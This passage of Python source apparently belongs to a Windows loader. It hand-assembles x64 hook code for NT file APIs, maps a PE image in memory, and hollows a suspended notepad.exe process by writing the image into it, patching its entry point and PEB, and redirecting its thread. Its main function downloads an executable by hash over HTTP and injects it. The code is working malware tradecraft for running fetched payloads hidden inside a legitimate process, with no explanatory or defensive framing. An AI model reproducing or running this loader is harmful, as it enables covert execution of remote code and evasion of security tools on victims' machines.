    a.e(b"\x48\x8B\x4C\x24\x20")
    a.e(b"\x48\x8B\x54\x24\x18")
    a.e(_imm64(b"\x48\xB8", tramp_a))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_nta = put(a.done())

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(_imm64(b"\x49\xBA", data))
    a.e(b"\x49\xFF\x42\x90")
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x39\xC1")
    a.jne32("orig")
    a.e(b"\x48\x8B\x44\x24\x68")
    a.e(b"\x48\x85\xC0")
    a.je32("usep")
    a.e(b"\x48\x8B\x00")
    a.jmp32("have")
    a.L("usep")
    a.e(_imm64(b"\x48\xB8", data))
    a.e(b"\x48\x8B\x40\x18")
    a.L("have")
    a.e(_imm64(b"\x49\xBA", data))
    a.e(b"\x49\x89\x42\x18")
    a.e(b"\x44\x8B\x44\x24\x60")
    a.e(b"\x4C\x8B\x4C\x24\x58")
    a.e(b"\x4D\x8B\x5A\x10")
    a.e(b"\x4C\x29\xC3")
    a.e(b"\x4D\x85\xDB")
    a.j8(0x79, "nn")
    a.e(b"\x4D\x33\xDB")
    a.L("nn")
    a.e(b"\x4D\x3B\xD8")
    a.j8(0x73, "nl")
    a.e(b"\x4D\x8B\xC3")
    a.L("nl")
    a.e(b"\x49\x8B\x42\x08")
    a.e(b"\x48\x03\x42\x18")
    a.e(b"\x4D\x85\xC0")
    a.je32("copied")
    a.e(b"\x4D\x8B\xD8")
    a.L("lpn")
    a.e(b"\x8A\x08")
    a.e(b"\x41\x88\x09")
    a.e(b"\x48\xFF\xC0")
    a.e(b"\x49\xFF\xC1")
    a.e(b"\x49\xFF\xCB")
    a.jne32("lpn")
    a.L("copied")
    a.e(b"\x4C\x01\x42\x18")
    a.e(b"\x4C\x8B\x4C\x24\x50")
    a.e(b"\x4D\x85\xC9")
    a.je32("okrd")
    a.e(b"\x49\xC7\x01\x00\x00\x00\x00")
    a.e(b"\x4D\x89\x41\x08")
    a.L("okrd")
    a.e(b"\x33\xC0\x48\x83\xC4\x28\xC3")
    a.L("orig")
    a.e(_imm64(b"\x48\xB8", tramp_r))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_ntr = put(a.done())

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(_imm64(b"\x49\xBA", data))
    a.e(b"\x49\xFF\x42\x98")
    a.e(b"\x8B\x44\x24\x50")
    a.e(b"\x41\x89\x42\xA0")
    a.e(_imm64(b"\x48\xB8", fake))
    a.e(b"\x48\x39\xC1")
    a.jne32("orig")
    a.e(b"\x8B\x44\x24\x50")
    a.e(b"\x83\xF8\x05")
    a.jne32("badc")
    a.e(b"\x49\x8B\x42\x10")
    a.e(b"\x49\x89\x00")
    a.e(b"\x49\x89\x40\x08")
    a.e(b"\x41\xC7\x40\x10\x01\x00\x00\x00")
    a.e(b"\x66\x41\xC7\x40\x14\x00\x00")
    a.jmp32("okq")
    a.L("badc")
    a.e(b"\xB8\x03\x00\x00\xC0")
    a.e(b"\x48\x83\xC4\x28\xC3")
    a.L("okq")
    a.e(b"\x48\x85\xD2")
    a.je32("noio")
    a.e(b"\x48\xC7\x02\x00\x00\x00\x00")
    a.e(b"\x48\xC7\x42\x08\x18\x00\x00\x00")
    a.L("noio")
    a.e(b"\x33\xC0\x48\x83\xC4\x28\xC3")
    a.L("orig")
    a.e(_imm64(b"\x48\xB8", tramp_q))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_ntq = put(a.done())

    extra_names = [store(x) for x in (b"NtCreateFile\x00", b"NtReadFile\x00", b"NtQueryInformationFile\x00")]
    fns = [
        addr_cfw, addr_cfa, addr_read, addr_gfs, addr_sfp,
        addr_gmf_w, addr_gmf_a, addr_ch, addr_gfsx, addr_sfpx,
        addr_ntc, addr_ntr, addr_ntq,
    ]
    name_addrs = name_addrs + extra_names
    table = (cur + 15) & ~15
    p = table
    for na, fa in zip(name_addrs, fns):
        ctypes.c_ulonglong.from_address(p).value = na
        ctypes.c_ulonglong.from_address(p + 8).value = fa
        p += 16
    ctypes.c_ulonglong.from_address(p).value = 0
    p += 16
    cur = p

    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    a.e(_imm64(b"\x48\xB8", data + 48))
    a.e(b"\x48\xFF\x00")
    a.e(b"\x48\x85\xD2")
    a.j8(0x74, "real")
    a.e(b"\x48\x81\xFA\x00\x00\x01\x00")
    a.j8(0x72, "real")
    a.e(_imm64(b"\x49\xB8", table))
    a.L("loop")
    a.e(b"\x49\x8B\x00")
    a.e(b"\x48\x85\xC0")
    a.j8(0x74, "real")
    a.e(b"\x45\x33\xC9")
    a.L("sc")
    a.e(b"\x46\x8A\x14\x08")
    a.e(b"\x42\x8A\x1C\x0A")
    a.e(b"\x41\x38\xDA")
    a.j8(0x75, "nxt")
    a.e(b"\x45\x84\xD2")
    a.j8(0x74, "found")
    a.e(b"\x49\xFF\xC1")
    a.j8(0xEB, "sc")
    a.L("found")
    a.e(b"\x49\x8B\x40\x08\x48\x83\xC4\x28\xC3")
    a.L("nxt")
    a.e(b"\x49\x83\xC0\x10")
    a.j8(0xEB, "loop")
    a.L("real")
    a.e(_imm64(b"\x48\xB8", gpa))
    a.e(b"\x48\x83\xC4\x28\xFF\xE0")
    addr_gpa = put(a.done())
    _patch_iat(pe, base, k32, gpa, addr_gpa)
    old = wintypes.DWORD()
    k32.VirtualProtect(ctypes.c_void_p(hook_base), 0x9000, PAGE_XRW, ctypes.byref(old))
    return {
        "data": data,
        "path": path_w_addr,
        "nbytes": (len(path_w) - 2),
        "CreateFileW": addr_cfw,
        "ReadFile": addr_read,
        "SetFilePointerEx": addr_sfpx,
        "CloseHandle": addr_ch,
        "self_path": self_path,
        "GetModuleFileNameW": addr_gmf_w,
        "NtCreateFile": addr_ntc,
        "NtOpenFile": addr_nto,
        "NtReadFile": addr_ntr,
        "NtQueryInformationFile": addr_ntq,
        "NtQueryAttributesFile": addr_nta,
    }


def _build_stub(pe, base, entry, dest):
    rva, _ = _dir(pe, 9)
    cbs = []
    if rva:
        cb_va = ctypes.c_ulonglong.from_address(base + rva + 24).value
        if cb_va:
            i = 0
            while i < 32:
                f = ctypes.c_ulonglong.from_address(cb_va + i * 8).value
                if not f:
                    break
                cbs.append(f)
                i += 1
    pdata_rva, pdata_sz = _dir(pe, 3)
    a = _Asm()
    a.e(b"\x48\x83\xEC\x28")
    if pdata_rva:
        a.e(_imm64(b"\x48\xB9", base + pdata_rva))
        a.e(b"\xBA" + struct.pack("<I", max(pdata_sz // 12, 1)))
        a.e(_imm64(b"\x49\xB8", base))
        a.e(_imm64(b"\x48\xB8", ctypes.cast(ctypes.WinDLL("ntdll").RtlAddFunctionTable, ctypes.c_void_p).value))
        a.e(b"\xFF\xD0")
    for cb in cbs:
        a.e(_imm64(b"\x48\xB9", base))
        a.e(b"\xBA\x01\x00\x00\x00\x45\x33\xC0")
        a.e(_imm64(b"\x48\xB8", cb))
        a.e(b"\xFF\xD0")
    a.e(b"\x48\x83\xC4\x28")
    a.e(_imm64(b"\x48\xB8", entry))
    a.e(b"\xFF\xE0")
    blob = a.done()
    ctypes.memmove(dest, blob, len(blob))
    return dest


def _patch_k32(k32, hproc, local, remote, io):
    old = wintypes.DWORD()
    nt = ctypes.WinDLL("ntdll")
    names = (
        ("kernel32", "GetModuleFileNameW"),
    )
    mods = {"kernel32": k32, "ntdll": nt}
    for mod, name in names:
        target = ctypes.cast(getattr(mods[mod], name), ctypes.c_void_p).value
        dest = remote + (io[name] - local)
        jmp = b"\x48\xB8" + struct.pack("<Q", dest) + b"\xFF\xE0"
        k32.VirtualProtectEx(hproc, ctypes.c_void_p(target), len(jmp), PAGE_XRW, ctypes.byref(old))
        if not k32.WriteProcessMemory(hproc, ctypes.c_void_p(target), jmp, len(jmp), None):
            raise ctypes.WinError(ctypes.get_last_error())


def _patch_remote_ntdll(k32, hproc, hooks):
    nt = ctypes.WinDLL("ntdll")
    names = ("NtCreateFile", "NtReadFile", "NtQueryInformationFile", "NtOpenFile")
    old = wintypes.DWORD()
    k32.VirtualProtectEx.restype = wintypes.BOOL
    k32.VirtualProtectEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    for name, hook in zip(names, hooks):
        target = ctypes.cast(getattr(nt, name), ctypes.c_void_p).value
        jmp = b"\x48\xB8" + struct.pack("<Q", hook) + b"\xFF\xE0"
        k32.VirtualProtectEx(hproc, ctypes.c_void_p(target), 16, PAGE_XRW, ctypes.byref(old))
        k32.WriteProcessMemory(hproc, ctypes.c_void_p(target), jmp, len(jmp), None)


def _map_local(raw):
    pe = _parse_pe(raw)
    k32 = _k32()
    overlay = pe["overlay"]
    extra = 0x9000 + len(raw) + 0x200
    total = pe["size_image"] + len(overlay) + extra
    preferred = pe["image_base"]
    base = _virt_alloc(k32, preferred, total)
    delta = base - preferred
    ctypes.memset(ctypes.c_void_p(base), 0, total)
    _map_image(pe, base)
    _relocs(pe, base, delta)
    imp_rva, _ = _dir(pe, 1)
    if imp_rva:
        _walk_imports(pe, imp_rva, base, preferred, k32)
    delay_rva, _ = _dir(pe, 13)
    if delay_rva:
        try:
            _walk_imports(pe, delay_rva, base, preferred, k32)
        except Exception:
            pass
    _hook_exit(pe, base, k32)
    if overlay:
        ctypes.memmove(ctypes.c_void_p(base + pe["size_image"]), overlay, len(overlay))
    hook_base = base + pe["size_image"] + len(overlay)
    hook_base = (hook_base + 15) & ~15
    raw_addr = hook_base + 0x8000
    ctypes.memmove(raw_addr, raw, len(raw))
    nthooks = _install_io_hooks(pe, base, k32, hook_base, raw_addr, len(raw))
    stub = _build_stub(pe, base, base + pe["entry"], raw_addr + len(raw) + 16)
    _protect(k32, pe, base)
    return pe, k32, base, total, stub, hook_base, nthooks


class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


def _inject(raw):
    pe, k32, local, total, entry, hook_base, nthooks = _map_local(raw)
    with open(nthooks["self_path"], "wb") as out:
        out.write(raw)
    image = ctypes.string_at(local, total)
    k32.CreateProcessW.restype = wintypes.BOOL
    k32.CreateProcessW.argtypes = [
        wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p, ctypes.c_void_p,
        wintypes.BOOL, wintypes.DWORD, ctypes.c_void_p, wintypes.LPCWSTR,
        ctypes.POINTER(STARTUPINFOW), ctypes.POINTER(PROCESS_INFORMATION),
    ]
    k32.VirtualAllocEx.restype = ctypes.c_void_p
    k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    k32.WriteProcessMemory.restype = wintypes.BOOL
    k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    k32.ReadProcessMemory.restype = wintypes.BOOL
    k32.ReadProcessMemory.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    k32.VirtualProtectEx.restype = wintypes.BOOL
    k32.VirtualProtectEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    k32.GetThreadContext.restype = wintypes.BOOL
    k32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
    k32.SetThreadContext.restype = wintypes.BOOL
    k32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()
    host = r"C:\Windows\System32\notepad.exe"
    if not k32.CreateProcessW(host, None, None, None, False, CREATE_SUSPENDED | 0x08000000, None, None, ctypes.byref(si), ctypes.byref(pi)):
        raise ctypes.WinError(ctypes.get_last_error())
    remote = k32.VirtualAllocEx(pi.hProcess, ctypes.c_void_p(local), total, MEM_COMMIT | MEM_RESERVE, PAGE_XRW)
    if not remote or remote != local:
        raise OSError("image base")
    if not k32.WriteProcessMemory(pi.hProcess, ctypes.c_void_p(remote), image, total, None):
        raise ctypes.WinError(ctypes.get_last_error())
    ctx = k32.VirtualAlloc(None, CTX_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    ctypes.memset(ctypes.c_void_p(ctx), 0, CTX_SIZE)
    ctypes.c_uint32.from_address(ctx + OFF_FLAGS).value = CTX_AMD64_FULL
    k32.GetThreadContext(pi.hThread, ctypes.c_void_p(ctx))
    peb = ctypes.c_uint64.from_address(ctx + OFF_RDX).value
    host_base = ctypes.c_uint64()
    k32.ReadProcessMemory(pi.hProcess, ctypes.c_void_p(peb + 0x10), ctypes.byref(host_base), 8, None)
    elf = ctypes.c_uint32()
    k32.ReadProcessMemory(pi.hProcess, ctypes.c_void_p(host_base.value + 0x3C), ctypes.byref(elf), 4, None)
    host_entry_rva = ctypes.c_uint32()
    k32.ReadProcessMemory(pi.hProcess, ctypes.c_void_p(host_base.value + elf.value + 0x28), ctypes.byref(host_entry_rva), 4, None)
    host_entry = host_base.value + host_entry_rva.value
    oldp = wintypes.DWORD()
    k32.VirtualProtectEx(pi.hProcess, ctypes.c_void_p(host_entry), 16, PAGE_XRW, ctypes.byref(oldp))
    k32.WriteProcessMemory(pi.hProcess, ctypes.c_void_p(host_entry), b"\xEB\xFE", 2, None)
    k32.ResumeThread(pi.hThread)
    stub = remote + (entry - local)
    for _ in range(50):
        time.sleep(0.05)
        k32.SuspendThread(pi.hThread)
        ctypes.memset(ctypes.c_void_p(ctx), 0, CTX_SIZE)
        ctypes.c_uint32.from_address(ctx + OFF_FLAGS).value = CTX_AMD64_FULL
        k32.GetThreadContext(pi.hThread, ctypes.c_void_p(ctx))
        if ctypes.c_uint64.from_address(ctx + OFF_RIP).value == host_entry:
            break
        k32.ResumeThread(pi.hThread)
    _patch_k32(k32, pi.hProcess, local, remote, nthooks)
    new_base = ctypes.c_uint64(remote)
    k32.WriteProcessMemory(pi.hProcess, ctypes.c_void_p(peb + 0x10), ctypes.byref(new_base), 8, None)
    params = ctypes.c_uint64()
    k32.ReadProcessMemory(pi.hProcess, ctypes.c_void_p(peb + 0x20), ctypes.byref(params), 8, None)
    us = struct.pack("<HH4xQ", nthooks["nbytes"], nthooks["nbytes"] + 2, nthooks["path"])
    k32.WriteProcessMemory(pi.hProcess, ctypes.c_void_p(params.value + 0x60), us, len(us), None)
    k32.WriteProcessMemory(pi.hProcess, ctypes.c_void_p(params.value + 0x70), us, len(us), None)
    ctypes.c_uint64.from_address(ctx + OFF_RIP).value = stub
    k32.SetThreadContext(pi.hThread, ctypes.c_void_p(ctx))
    k32.ResumeThread(pi.hThread)
    k32.CloseHandle(pi.hThread)
    k32.CloseHandle(pi.hProcess)


def main():
    key = HASH.strip().lower()
    if len(key) != 64 or any(c not in "0123456789abcdef" for c in key):
        return 2
    blob = _http("GET", "/pe/hash/" + key)
    _inject(blob)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

